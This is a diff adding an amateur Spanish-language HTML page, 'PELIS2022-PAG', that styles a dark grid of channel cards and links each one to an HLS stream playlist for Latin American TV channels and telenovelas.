@@ -1,0 +1,686 @@
+﻿<!DOCTYPE html>
+<html dir='ltr' lang='es' prefix='og: http://ogp.me/ns#' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<!-- Basic data -->
+<meta charset='UTF-8'/>
+<meta content='article' property='og:type'/>
+<!-- Responsive viewport -->
+<meta content='width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0' name='viewport'/>
+<!-- Title -->
+<title>PELIS2022-PAG</title>
+<style type='text/css'>
+*{margin:0;padding:0;box-sizing:border-box;list-style:grid;}
+a{text-decoration:none;}
+body{background:#000;font-family:Nunito,sans-serif;}
+
+.cards{display:grid;grid-template-columns:repeat(5,1fr);grid;align-items: stretch;
+    justify-items: stretch;}
+
+.card{text-align:center;}
+.card img{
+    padding: 0px;
+    padding-top: 0px;
+    width: 90%;
+    height: 70%;
+border-radius:7px;}
+
+.card span{padding:0 .3rem;display:none;}
+a{-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-tap-highlight-color:transparent;} 
+.form__group{position:relative;padding:15px 0 0;margin:0 auto;margin-top:10px;margin-bottom:1rem;width:90%;}
+.form__field{font-family:inherit;width:100%;border:0;border-bottom:2px solid #9b9b9b;outline:0;font-size:1.3rem;color:#fff;padding:7px 0;background:0 0;transition:border-color .2s;}
+.form__field::placeholder{color:transparent;}
+.form__field:placeholder-shown~.form__label{font-size:1.3rem;cursor:text;top:20px;}
+.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:#fff;}
+.form__field:focus{padding-bottom:6px;font-weight:700;border-width:3px;border-image:linear-gradient(to right,red,#008cf7,red);border-image-slice:1;}
+.form__field:focus~.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:red;font-weight:700;}
+.form__field:invalid,.form__field:required{box-shadow:none;}
+
+
+
+/*Fix: Unnecessary elements removed*/
+.widget-item-control,.item-control.blog-admin,
+.continue,.loadmore,.thread-chrome.thread-collapsed,
+.singleton-element:not(.cookie-choices-info),
+.noAllowNewComments .comment-reply,
+.comments .hidden {display:none;}
+/*Fix: Show lightbox*/
+.CSS_LIGHTBOX{z-index:90001!important;}
+/*Fix: Image responsive*/
+a[imageanchor]:not([style*=float]){margin-right:0!important;margin-left:0!important;}
+.widget-content img,
+img[data-original-height],
+img[data-original-width] {height: auto;}
+/*Fix: Comment Editor*/
+#comment-editor{border:0;width:100%;min-height:220px;}
+.box{margin:0 auto;margin-bottom:2rem;width:60%;display:flex;align-items:center;}
+#caps{font-size:1.3rem;}
+.progress{background:#212042;width:100%;height:15px;border-radius:10px;}
+.progress-bar{width:0;opacity:0;height:15px;background:linear-gradient(to right,#228ee9,#1b7dbf);border-radius:10px;display:flex;justify-content:center;align-items:center;transition:1s ease;}
+.box span{padding-left:10px;color:#fff;}
+
+
+
+.xaviec {
+    background: #000;
+    position: fixed;
+    top: -16px;
+    right: -0.5em;
+    width: 20%;
+}
+
+
+
+.card h6{
+background:#212042;
+position:auto;
+margin-bottom:20%;
+color:#fff;
+font-size:0.9.5rem;
+border-radius:7px;
+}
+
+
+/* prueba de paginacion */
+.paginacion {
+	padding-top:10%;
+}
+
+.paginacion ul {
+	list-style:none;
+	text-align: center;
+}
+
+.paginacion ul li {
+	display:inline-block;
+	margin-right:5px;
+}
+
+.paginacion ul li a {
+	display:block;
+	padding:5px 10px;
+	color:#fff;
+	background:#024959;
+	text-decoration: none;
+}
+
+.paginacion ul li a:hover {
+	background:#ff0000;
+}
+
+.paginacion ul li .active {
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
+    transition-delay: 0.1s;
+}
+
+
+/* luz de neon alrededor */
+
+
+img:hover{
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000; /*efecto con el mouse*/
+}
+
+
+
+
+
+
+        /*          Pagination
+        ***************************/
+        /*Pagination Links Background*/
+
+
+
+.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.nav-links a,.nav-links span,.tagcloud a{background-color: #313036 }
+        @media screen and (max-width:62em){
+            .Menu>ul>li{border-bottom-color: #313036 }
+            .Menu .sub-menu a{background-color: #313036 }
+        }
+        /*Pagination Links Background Hover*/.menu-azlist ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{background-color: #de1212 }
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a:hover{background-color: #de1212 }
+        }
+        /*Pagination Links Color*/.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.tagcloud a{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a{color: #fff !important}
+        }
+        /*Pagination Links Color Hover*/.Menu li.menu-azlist:hover ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu li:hover .sub-menu li:hover a,.Menu .sub-menu li:hover:before{color: #fff !important}
+        }
+
+
+
+
+
+
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+}
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+    --dark-2: rgba(0,0,0,.2);
+    --dark-5: rgba(0,0,0,.5);
+    --light-1: rgba(255,255,255,.1);
+    --light-2: rgba(255,255,255,.2);
+    --light-7: rgba(255,255,255,.7);
+    --success: #28a745;
+    --danger: #FF5757;
+    --warning: #ffc107;
+    --size: 1rem;
+    --f-size: 1rem;
+    --family: 'Work Sans';
+}
+
+
+
+
+
+.pagination {
+    text-align: center;
+    font-weight: 700;
+    margin-bottom: var(--size);
+}
+
+a:-webkit-any-link {
+    color: -webkit-link;
+    cursor: pointer;
+    text-decoration: underline;
+}
+
+.btn.snd, .page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+.btn, button, [type=button], [type=reset], [type=submit], .pagination a, .extend, .tagcloud a, a.comment-reply-link {
+    cursor: pointer;
+    padding: .5rem 0.1rem;
+    display: inline-block;
+    vertical-align: top;
+    text-align: center;
+    line-height: 2rem;
+    width: auto;
+    background-color: var(--light-2);
+    color: var(--light);
+    min-width: 3rem;
+    border: 0;
+}
+
+
+.page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+
+
+
+
+
+
+
+.boton {
+    width: 8em;
+    height: 2em;
+border: 1px solid #2e5c8b;; /*anchura, estilo y color borde*/
+padding: 8px; /*espacio alrededor texto*/
+background-color: #20f504; /*color botón*/
+color: #ffffff; /*color texto*/
+text-decoration: none; /*decoración texto*/
+text-transform: uppercase; /*capitalización texto*/
+font-family: 'Helvetica', sans-serif; /*tipografía texto*/
+border-radius: 50px; /*bordes redondos*/
+    position: absolute;
+    top: 2em;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</style>
+<link href='https://fonts.googleapis.com/css2?family=Nunito&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Lato&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Montserrat&display=swap' rel='stylesheet'/>
+
+
+<nav class="navigation pagination">
+<div class="nav-links">
+<a href="" ></a>
+<a href="" ></a>
+<a class="page-link" href="C:\Users\Terminal 2\Documents\A Escritorio julio 2022\GITHUB PELIS Y SERIES PARA SUBIR A INTERNET\Nueva carpeta (2)\PELIS2022\PLUTO.html"_blank" 
+>PLUTO TV</a>
+<a class="page-link current" href="C:\Users\Terminal 2\Documents\A Escritorio julio 2022\GITHUB PELIS Y SERIES PARA SUBIR A INTERNET\Nueva carpeta (2)\PELIS2022\VIX.html" >VIX TV</a>
+
+<a href="javascript:void(0)" class="extend"></a>
+<a class="page-link" href="" ></a>
+
+
+</div>
+</nav>
+
+
+
+</head>
+<body>
+
+
+
+
+
+
+
+<!--LAS DEMÁS-->
+<div class="xaviec">
+<div class="form__group field">
+<input autocomplete="off" type="input" onkeyup="myFunction()" class="form__field" placeholder="Buscar" name="name" id="myInput" required />
+<label for="name" class="form__label">Buscar</label>
+</div></div></div><br><br><br><br>
+<center><ul class="cards" id="cards">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li> <a href="	https://linear-46.frequency.stream/dist/plex/46/hls/master/playlist.m3u8?	 " target="_blank"  class="card"> <img src="	https://provider-static.plex.tv/epg/images/ott_channels/logos/afv-espanol.png	"/> <h6>	 AFV Español	</h6></a></li>
+<li> <a href="	https://linear-46.frequency.stream/dist/localnow/46/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://attachments.f95zone.com/2017/12/60328_lol-icon.png	"/> <h6>	Videos Chistosos	</h6></a></li>
+<li> <a href="	https://linear-49.frequency.stream/dist/localnow/49/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://attachments.f95zone.com/2017/12/60328_lol-icon.png	"/> <h6>	 Videos Chistosos 2	</h6></a></li>
+<li> <a href="	https://linear-192.frequency.stream/dist/localnow/192/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://radio-corporacion.com/wp-content/uploads/2017/07/512x512bb.jpg	"/> <h6>	 Cine Club - PrendeTV	</h6></a></li>
+<li> <a href="	https://linear-193.frequency.stream/193/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.informador.mx/__export/1607925317802/sites/elinformador/img/2020/12/13/leon_campeon_crop1607924025702.jpg_788543494.jpg	"/> <h6>	 LO MEJOR DE LA LIGA MX 	</h6></a></li>
+<li> <a href="	https://linear-193.frequency.stream/dist/localnow/193/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://a.espncdn.com/combiner/i?img=/i/teamlogos/soccer/500/20279.png	"/> <h6>	 Lo Mejor de la Liga MX - PrendeTV	</h6></a></li>
+<li> <a href="	https://linear-194.frequency.stream/dist/localnow/194/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.rbr.com/wp-content/uploads/prende-tv.jpg	"/> <h6>	 Novelas de Romance - PrendeTV	</h6></a></li>
+<li> <a href="	https://linear-195.frequency.stream/dist/localnow/195/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.rbr.com/wp-content/uploads/prende-tv.jpg	"/> <h6>	 Novelas en Familia - PrendeTV	</h6></a></li>
+<li> <a href="	https://linear-196.frequency.stream/dist/localnow/196/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.rbr.com/wp-content/uploads/prende-tv.jpg	"/> <h6>	 Novelas de Oro - PrendeTV	</h6></a></li>
+<li> <a href="	http://linear-218.frequency.stream/218/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://wikidat.com/img/tv-pg-9d0ada694189a3db3de1e6bd45458398.jpg	"/> <h6>	  PG	</h6></a></li>
+<li> <a href="	https://linear-254.frequency.stream/dist/localnow/254/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/8/81/Univision_News.png	"/> <h6>	 Noticias Univision 24/7	</h6></a></li>
+<li> <a href="	https://linear-254.frequency.stream/dist/localnow/254/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://m.media-amazon.com/images/I/51ro5qOyq+L._SL500_.png	"/> <h6>	 UNIVISION NOTICIAS	</h6></a></li>
+<li> <a href="	https://linear-255.frequency.stream/dist/localnow/255/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Euronews._2016_alternative_logo.png/600px-Euronews._2016_alternative_logo.png	"/> <h6>	 EuroNews	</h6></a></li>
+<li> <a href="	https://linear-256.frequency.stream/dist/localnow/256/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://e7.pngegg.com/pngimages/926/67/png-clipart-bein-sports-united-states-bein-media-group-al-jazeera-bein-sport-purple-violet-thumbnail.png	"/> <h6>	 Bein Sports Xtra	</h6></a></li>
+<li> <a href="	https://linear-257.frequency.stream/dist/localnow/257/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://image.roku.com/developer_channels/prod/9f7fc5d8c5bd2b94be1ae3d9dc17ffd5f14d9f98fac4d1e2ec7a29064946ee13.png	"/> <h6>	  LATIDO	</h6></a></li>
+<li> <a href="	https://linear-258.frequency.stream/dist/localnow/258/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://pbs.twimg.com/profile_images/1034455064633647104/SD5M8e12_400x400.jpg	"/> <h6>	  ATV+	</h6></a></li>
+<li> <a href="	https://linear-260.frequency.stream/dist/localnow/260/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://image.roku.com/developer_channels/prod/23100b95435e3b7683d5a71d92326fe14e753576d548ce07ecfa344c1a250ce7.png	"/> <h6>	  VIVO play	</h6></a></li>
+<li> <a href="	https://linear-258.frequency.stream/dist/localnow/258/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://pbs.twimg.com/profile_images/1034455064633647104/SD5M8e12_400x400.jpg	"/> <h6>	 ATV+	</h6></a></li>
+<li> <a href="	https://linear-259.frequency.stream/dist/localnow/259/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/TN23logo2016.png/375px-TN23logo2016.png	"/> <h6>	 TN23	</h6></a></li>
+<li> <a href="	https://linear-260.frequency.stream/dist/localnow/260/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://image.roku.com/developer_channels/prod/23100b95435e3b7683d5a71d92326fe14e753576d548ce07ecfa344c1a250ce7.png	"/> <h6>	 Vivo Play	</h6></a></li>
+<li> <a href="	https://linear-261.frequency.stream/dist/localnow/261/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://mytimemovienetwork.com/wp-content/uploads/2020/09/site-logo.png	"/> <h6>	  MY TIME	</h6></a></li>
+<li> <a href="	https://linear-261.frequency.stream/dist/localnow/261/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://mytimemovienetwork.com/wp-content/uploads/2020/09/site-logo.png	"/> <h6>	 My Time Movies	</h6></a></li>
+<li> <a href="	https://linear-262.frequency.stream/dist/localnow/262/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://mma.prnewswire.com/media/848210/Nuestra_Vision_Logo.jpg	"/> <h6>	 Nuestra Vision	</h6></a></li>
+<li> <a href="	https://linear-263.frequency.stream/dist/localnow/263/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.logomyway.com/logos_new/25398/2a_968529648441.jpg	"/> <h6>	 Level Up - Games	</h6></a></li>
+<li> <a href="	https://linear-262.frequency.stream/dist/localnow/262/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://mma.prnewswire.com/media/848210/Nuestra_Vision_Logo.jpg	"/> <h6>	  NUESTRA VISION	</h6></a></li>
+<li> <a href="	https://linear-263.frequency.stream/dist/localnow/263/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.ytimg.com/vi/63pNVNU7EJw/mqdefault.jpg	"/> <h6>	  LEVEI UP tv	</h6></a></li>
+<li> <a href="	https://linear-264.frequency.stream/dist/localnow/264/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.pinimg.com/736x/d7/64/03/d764036cf9653da6a6fe54c684acde20.jpg	"/> <h6>	  BLACK PIX	</h6></a></li>
+<li> <a href="	https://linear-286.frequency.stream/286/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://cdns-images.dzcdn.net/images/artist/a0b00452185e46f1fb541cf9287b9599/500x500.jpg	"/> <h6>	 RCN más 	</h6></a></li>
+<li> <a href="	https://linear-286.frequency.stream/dist/localnow/286/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://cdns-images.dzcdn.net/images/artist/a0b00452185e46f1fb541cf9287b9599/500x500.jpg	"/> <h6>	 RCN Mas	</h6></a></li>
+<li> <a href="	https://linear-300.frequency.stream/dist/localnow/300/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/3/3c/Foro_%28Televisa%29.png	"/> <h6>	 Foro TV	</h6></a></li>
+<li> <a href="	https://linear-300.frequency.stream/300/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/artworks-000108262107-foogcg-t500x500.jpg	"/> <h6>	 FORO TV 	</h6></a></li>
+<li> <a href="	https://linear-301.frequency.stream/301/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://pbs.twimg.com/profile_images/1508304729473957888/KybUKjtU_400x400.jpg	"/> <h6>	 NMEDIA+ 	</h6></a></li>
+<li> <a href="	https://linear-305.frequency.stream/dist/localnow/305/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.ecured.cu/images/4/4d/Poster-amores-verdaderos.jpg	"/> <h6>	 Amores Verdaderos	</h6></a></li>
+<li> <a href="	https://linear-306.frequency.stream/306/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.ytimg.com/vi/EPyg15gdppw/mqdefault.jpg	"/> <h6>	 AQUÍ Y AHORA	</h6></a></li>
+<li> <a href="	https://linear-306.frequency.stream/dist/localnow/306/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.ytimg.com/vi/EPyg15gdppw/mqdefault.jpg	"/> <h6>	 Aqui y Ahora	</h6></a></li>
+<li> <a href="	https://linear-307.frequency.stream/dist/localnow/307/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://techbigs.com/uploads/2022/1/vix-cine-tv-gratis-icon.jpg	"/> <h6>	 Cine 1	</h6></a></li>
+<li> <a href="	https://linear-308.frequency.stream/dist/localnow/308/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://techbigs.com/uploads/2022/1/vix-cine-tv-gratis-icon.jpg	"/> <h6>	 Cine 2	</h6></a></li>
+<li> <a href="	https://linear-309.frequency.stream/dist/localnow/309/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://techbigs.com/uploads/2022/1/vix-cine-tv-gratis-icon.jpg	"/> <h6>	 Cine 3	</h6></a></li>
+<li> <a href="	https://linear-310.frequency.stream/dist/localnow/310/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.ytimg.com/vi/MKxtqP5E4cM/hqdefault.jpg	"/> <h6>	 XH Derbez	</h6></a></li>
+<li> <a href="	https://linear-311.frequency.stream/dist/localnow/311/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://cloudfront-us-east-1.images.arcpublishing.com/gruponacion/UZC7RBD22NCIFAFETX7LZ4RODA.jpg	"/> <h6>	 Familia P. Luche	</h6></a></li>
+<li> <a href="	https://linear-312.frequency.stream/dist/localnow/312/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.tvyespectaculos.mx/wp-content/uploads/2013/02/Durmiendo.jpg	"/> <h6>	 Durmiendo con mi Jefe	</h6></a></li>
+<li> <a href="	https://linear-313.frequency.stream/dist/localnow/313/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.sdpnoticias.com/resizer/0V1HfKJ_7Tv1kjvzlhz0tnSZpdI=/640x360/filters:format(jpg):quality(70)/cloudfront-us-east-1.images.arcpublishing.com/sdpnoticias/VNGOZ4N4JRHZRNFTPD4OOSNVF4.jpg	"/> <h6>	 El Privilegio de Mandar	</h6></a></li>
+<li> <a href="	https://linear-314.frequency.stream/dist/localnow/314/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://http2.mlstatic.com/D_NQ_NP_638956-MLM45856062948_052021-O.jpg	"/> <h6>	 Vecinos	</h6></a></li>
+<li> <a href="	https://linear-315.frequency.stream/315/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://st1.uvnimg.com/fc/36/ea563598458e8920fe52f2232df4/showcard-landscape-27.jpg	"/> <h6>	 CRÓNICAS	</h6></a></li>
+<li> <a href="	https://linear-315.frequency.stream/dist/localnow/315/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://st1.uvnimg.com/fc/36/ea563598458e8920fe52f2232df4/showcard-landscape-27.jpg	"/> <h6>	 Crónicas	</h6></a></li>
+<li> <a href="	https://linear-316.frequency.stream/dist/localnow/316/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://lastfm.freetls.fastly.net/i/u/500x500/3be4b69884238a92cbea555d33b0623a.jpg	"/> <h6>	 Cuidado con el Angel	</h6></a></li>
+<li> <a href="	https://linear-317.frequency.stream/317/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.ipuntotv.com/IMAGES/Unicable-Mexico-de-mil-sabores-1.png	"/> <h6>	 MÉXICO MIL SABORES	</h6></a></li>
+<li> <a href="	https://linear-317.frequency.stream/dist/localnow/317/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.thedailytelevision.com/sites/default/files/notas/imagenes/del-mercado-al-plato-mediano.jpg	"/> <h6>	 Del Mercado al Plato	</h6></a></li>
+<li> <a href="	https://linear-318.frequency.stream/dist/localnow/318/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.telenovelas.nl/791/comprar-la-telenovela-soy-tu-duena-completo-en-usb-y-dvd.jpg	"/> <h6>	 Soy tu Dueña	</h6></a></li>
+<li> <a href="	https://linear-319.frequency.stream/dist/localnow/319/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://direct.rhapsody.com/imageserver/images/alb.28001623/500x500.jpg	"/> <h6>	 Alegrijes y Rebujos	</h6></a></li>
+<li> <a href="	https://linear-320.frequency.stream/dist/localnow/320/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://m.media-amazon.com/images/M/MV5BY2E2OTEyNTktMTU2Yi00NzhmLTk5NTgtMzM2MzEzYjgzMzIxXkEyXkFqcGdeQXVyMTgxOTIzNzk@._V1_.jpg	"/> <h6>	 Amigas y Rivales	</h6></a></li>
+<li> <a href="	https://linear-321.frequency.stream/dist/localnow/321/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.telenovelas.nl/1068/comprar-la-telenovela-tres-veces-ana-completo-en-usb-y-dvd.jpg	"/> <h6>	 Tres Veces Ana	</h6></a></li>
+<li> <a href="	https://linear-322.frequency.stream/dist/localnow/322/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://akamai.sscdn.co/letras/500x500/albuns/f/d/b/2/909721592246052.jpg	"/> <h6>	 Clase 406	</h6></a></li>
+<li> <a href="	https://linear-323.frequency.stream/dist/localnow/323/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/artworks-000080771906-hgicil-t500x500.jpg	"/> <h6>	 Héroes del Norte	</h6></a></li>
+<li> <a href="	https://linear-324.frequency.stream/dist/localnow/324/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/artworks-000201005462-s7qhjz-t500x500.jpg	"/> <h6>	 Teresa	</h6></a></li>
+<li> <a href="	https://linear-325.frequency.stream/dist/localnow/325/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.pinimg.com/originals/b7/ec/16/b7ec168b2fe818a9ff2d16d1385e2752.jpg	"/> <h6>	la madrastra	</h6></a></li>
+<li> <a href="	https://linear-327.frequency.stream/dist/localnow/327/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://img.sharetv.com/shows/standard/juana_la_virgen.jpg	"/> <h6>	 Juana la Virgen	</h6></a></li>
+<li> <a href="	https://linear-328.frequency.stream/dist/localnow/328/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/artworks-000058196579-3103of-t500x500.jpg	"/> <h6>	 María Mercedes	</h6></a></li>
+<li> <a href="	https://linear-329.frequency.stream/dist/localnow/329/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.pinimg.com/originals/c2/15/9b/c2159bf571d093b4f9b08744b4e9cb89.jpg	"/> <h6>	 Que Bonito Amor 	</h6></a></li>
+<li> <a href="	https://linear-330.frequency.stream/dist/localnow/330/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.pinimg.com/736x/d7/64/03/d764036cf9653da6a6fe54c684acde20.jpg	"/> <h6>	 ViX 	</h6></a></li>
+<li> <a href="	https://linear-331.frequency.stream/dist/localnow/331/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://elcomercio.pe/resizer/dD8_uXIOrv1NdrE2uJlgfGEKM_I=/980x528/smart/filters:format(jpeg):quality(75)/cloudfront-us-east-1.images.arcpublishing.com/elcomercio/TGQK5ZOODFHSZOMX4ZFDLXF3KY.jpg	"/> <h6>	 Muchachitas	</h6></a></li>
+<li> <a href="	https://linear-332.frequency.stream/dist/localnow/332/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.ytimg.com/vi/qSjyx9SoQqk/hqdefault.jpg	"/> <h6>	 Muchachitas como Tu 	</h6></a></li>
+<li> <a href="	https://linear-334.frequency.stream/dist/localnow/334/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://images.tokopedia.net/img/cache/500-square/product-1/2018/6/21/24289032/24289032_ca8f8e80-dfe3-42d2-8167-45a0ab84e343_500_700.jpg	"/> <h6>	 Mi Gorda Bella 	</h6></a></li>
+<li> <a href="	https://linear-335.frequency.stream/dist/localnow/335/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://lastfm.freetls.fastly.net/i/u/500x500/80438d92f97af06290d37ddc68a44e36.jpg	"/> <h6>	 Rebelde	</h6></a></li>
+<li> <a href="	https://linear-336.frequency.stream/dist/localnow/336/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://hips.hearstapps.com/es.h-cdn.co/teleprogramaes/images/telenovela/papa-a-toda-madre/personajes-papa-a-toda-madre/12899694-2-esl-ES/quien-es-quien-en-papa-a-toda-madre.jpg	"/> <h6>	 Papa a toda Madre 	</h6></a></li>
+<li> <a href="	https://linear-337.frequency.stream/dist/localnow/337/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.ecured.cu/images/e/e1/Sortilegio-esmas.jpg	"/> <h6>	 Sortilegio	</h6></a></li>
+<li> <a href="	https://linear-338.frequency.stream/dist/localnow/338/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.ecured.cu/images/5/5e/Triunfo_del_amor_portada.jpg	"/> <h6>	 Triunfo del Amor	</h6></a></li>
+<li> <a href="	https://linear-340.frequency.stream/dist/localnow/340/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.lavozdemichoacan.com.mx/wp-content/uploads/2018/05/40-y-20.jpg	"/> <h6>	 40 y 20	</h6></a></li>
+<li> <a href="	https://linear-341.frequency.stream/341/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.atv.pe/wp-content/uploads/2020/09/atv-como-dice-el-dicho-logo-grande-min.png	"/> <h6>	 COMO DICE EL DICHO	</h6></a></li>
+<li> <a href="	https://linear-344.frequency.stream/344/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/artworks-000508596741-4txbmm-t500x500.jpg	"/> <h6>	 ROSA DE GUADALUPE	</h6></a></li>
+<li> <a href="	https://linear-341.frequency.stream/dist/localnow/341/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/en/b/bb/ComoDiceElDicho.jpg	"/> <h6>	 Como dice El Dicho	</h6></a></li>
+<li> <a href="	https://linear-342.frequency.stream/dist/localnow/342/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/artworks-000201005462-s7qhjz-t500x500.jpg	"/> <h6>	 Teresa	</h6></a></li>
+<li> <a href="	https://linear-343.frequency.stream/dist/localnow/343/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://1.bp.blogspot.com/-wloSUHhk9vs/YT3Vu65_JEI/AAAAAAAABUo/TlklV6Xar1gAjj8xjP20a182IHyGRR0HgCLcBGAsYHQ/s240/La%2BPromesa.jpg	"/> <h6>	 La Promesa	</h6></a></li>
